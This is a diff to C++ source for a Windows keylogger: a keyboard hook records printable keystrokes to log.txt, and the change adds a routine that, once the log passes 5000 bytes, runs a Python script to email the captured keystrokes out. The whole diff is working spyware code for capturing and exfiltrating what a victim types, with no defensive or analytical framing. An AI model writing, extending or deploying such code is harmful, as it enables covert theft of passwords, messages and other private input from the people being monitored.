@@ -2,6 +2,9 @@
 #include <iostream>
 #include <fstream>
 #include <unordered_set>
+#include <string>
+#include <sstream>
+#include <cstdlib>  // For system() function
 
 using namespace std;
 
@@ -10,6 +13,23 @@ unordered_set<int> pressedKeys;
 
 bool isPrintableChar(int key) {
     return (key >= 32 && key <= 126);
+}
+
+void checkAndSendLog() {
+    ifstream inFile("log.txt", ios::ate);
+    if (inFile.is_open()) {
+        streamsize size = inFile.tellg();
+        if (size >= 5000) {
+            inFile.close();
+            logFile.close();
+
+            // Call the Python script to send email
+            system("python send_email.py");
+
+            // Reopen the log file
+            logFile.open("log.txt", ios::app);
+        }
+    }
 }
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
@@ -27,6 +47,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                 logFile.put(' ');
             }
             logFile.flush();
+            checkAndSendLog();
         } else if (wParam == WM_KEYUP) {
             pressedKeys.erase(key);
         }
